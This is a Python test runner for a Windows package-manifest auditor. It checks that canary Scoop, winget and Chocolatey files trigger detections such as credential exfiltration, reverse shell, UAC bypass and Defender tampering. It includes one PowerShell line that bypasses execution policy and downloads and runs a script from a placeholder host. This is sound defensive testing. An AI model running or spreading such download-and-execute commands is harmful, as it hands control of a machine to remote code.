#!/usr/bin/env python3
"""Canary + benign regression tests. Run: python3 tests/run_tests.py
Every canary is inert: reserved/example hosts, placeholder payloads, never executed."""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import winpkg_audit as wa  # noqa: E402

EXPECT = {  # canary -> (min level, pattern id that must fire)
    "scoop-iex.json": ("CRITICAL", "download_exec"),
    "scoop-motw.json": ("HIGH", "motw_strip"),
    "scoop-plaintext.json": ("HIGH", "unverified_plaintext"),
    "winget-plaintext.yaml": ("HIGH", "unverified_plaintext"),
    "winget-switch.yaml": ("CRITICAL", "download_exec"),
    "choco-encoded": ("CRITICAL", "encoded_exec"),
    "choco-defender": ("CRITICAL", "defender_tamper"),
    "choco-exfil": ("CRITICAL", "credential_exfil"),
    "choco-fetchexec": ("HIGH", "fetch_exec"),
    "choco-lolbin": ("HIGH", "lolbin_download"),
    "choco-uac": ("CRITICAL", "uac_bypass"),
    "choco-firewall": ("CRITICAL", "security_disable"),
    "choco-revshell": ("CRITICAL", "reverse_shell"),
    "choco-execpolicy": ("HIGH", "execpolicy_persist"),
    "choco-tls": ("HIGH", "tls_bypass"),
    "choco-hosts": ("HIGH", "hosts_tamper"),
    "choco-webhook": ("HIGH", "suspicious_host"),
    "choco-obfuscated": ("MEDIUM", "obfuscation"),
    "choco-nochecksum-http": ("HIGH", "unverified_plaintext"),
    "choco-persist-runkey": ("CRITICAL", "persistence"),
}


def run(path):
    targets = wa.from_path(path)
    assert len(targets) == 1, (path, [t[0] for t in targets])
    return wa.scan_target(*targets[0])


fail = 0
for name, (lvl, pid) in EXPECT.items():
    r = run(os.path.join(HERE, "canaries", name))
    ids = {f["id"] for f in r["findings"]}
    ok = wa.SEVERITY_RANK[r["risk_level"]] >= wa.SEVERITY_RANK[lvl] and pid in ids
    fail += not ok
    print("PASS" if ok else "FAIL", name, r["risk_level"], sorted(ids))
for name in sorted(os.listdir(os.path.join(HERE, "benign"))):
    r = run(os.path.join(HERE, "benign", name))
    ok = r["risk_level"] == "SAFE"
    fail += not ok
    print("PASS" if ok else "FAIL", name, r["risk_level"], [(f["id"], f["line"]) for f in r["findings"]])
r = wa.scan("Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object Net.WebClient).DownloadString('https://example.invalid/i.ps1'))")
ok = r["risk_level"] == "CRITICAL"
fail += not ok
print("PASS" if ok else "FAIL", "--text snippet", r["risk_level"])
print("\n%d failed" % fail)
sys.exit(1 if fail else 0)
